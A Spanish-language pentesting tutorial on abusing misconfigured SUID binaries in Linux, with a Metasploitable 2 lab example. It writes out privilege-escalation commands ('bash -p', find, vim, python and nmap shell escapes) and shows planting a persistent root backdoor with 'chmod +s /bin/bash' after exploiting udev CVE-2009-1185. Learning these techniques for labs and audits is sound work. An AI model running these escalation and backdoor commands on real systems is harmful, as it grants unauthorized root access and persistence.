# Misconfigured SUID

## Descripción

El bit **SUID (Set User ID)** es un permiso especial de Linux que permite que un ejecutable se ejecute **con los permisos del propietario del archivo** en lugar de los del usuario que lo lanza. Cuando un binario tiene SUID y pertenece a root, cualquier usuario puede ejecutarlo con privilegios de root.

Una mala configuración ocurre cuando binarios que no deberían tenerlo tienen el bit SUID activado, o cuando un atacante lo activa manualmente en `/bin/bash` para mantener acceso como root.

---

## Identificación

Buscar todos los binarios con SUID en el sistema:

```shell
find / -perm -4000 -type f 2>/dev/null
```

Los binarios SUID legítimos y normales son:
```
/bin/su
/bin/mount
/bin/umount
/bin/ping
/usr/bin/passwd
/usr/bin/sudo
```

Lo que debes buscar son binarios **inusuales** con SUID como `bash`, `vim`, `find`, `python`, `nmap`, etc.

### Reconocer el bit SUID en los permisos

```shell
ls -la /bin/bash
```

Sin SUID (normal):
```
-rwxr-xr-x 1 root root 701808 /bin/bash
```

Con SUID activado (vulnerable):
```
-rwsr-sr-x 1 root root 701808 /bin/bash
```

La `s` en lugar de la `x` indica que el SUID está activo.

---

## Explotación

### bash con SUID

Si `/bin/bash` tiene SUID activado:

```shell
bash -p
whoami   # root
id       # euid=0(root)
```

La flag `-p` indica a bash que mantenga el EUID efectivo (root) en lugar de bajarlo al UID real del usuario.

### Otros binarios comunes — GTFOBins

Consulta [https://gtfobins.github.io](https://gtfobins.github.io) para ver cómo abusar de cualquier binario con SUID. Ejemplos:

**find:**
```shell
find . -exec /bin/bash -p \; -quit
```

**vim:**
```shell
vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'
```

**python:**
```shell
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

**nmap (versiones antiguas):**
```shell
nmap --interactive
# Dentro de nmap:
!sh
```

---

## Activar SUID manualmente (post-explotación)

Cuando obtienes RCE o ejecución como root via otro exploit, puedes activar el SUID en bash como **backdoor persistente**:

```shell
chmod +s /bin/bash
```

Después cualquier usuario del sistema puede ejecutar:

```shell
bash -p
whoami  # root
```

Este es el método usado en el exploit **udev CVE-2009-1185** donde el payload `/tmp/run` activa el SUID en bash.

---

## Notas importantes

- La diferencia entre `uid` y `euid` es clave: `uid` es quien eres realmente, `euid` es con qué permisos estás actuando. Con SUID en bash, `euid=0(root)` aunque tu `uid` sea `www-data`.
- El bit SUID en bash es una señal clara de compromiso en una auditoría forense.
- En sistemas modernos con protecciones adicionales (AppArmor, SELinux), el abuso de SUID puede estar restringido.

---

## Ejemplo real — Máquina Metasploitable 2

El exploit udev CVE-2009-1185 ejecutó el payload `/tmp/run` como root, que contenía:

```bash
#!/bin/bash
chmod +s /bin/bash
```

Tras ejecutar el exploit:

```shell
ls -la /bin/bash
# -rwsr-sr-x 1 root root 701808 Apr 14  2008 /bin/bash

bash -p
# uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```
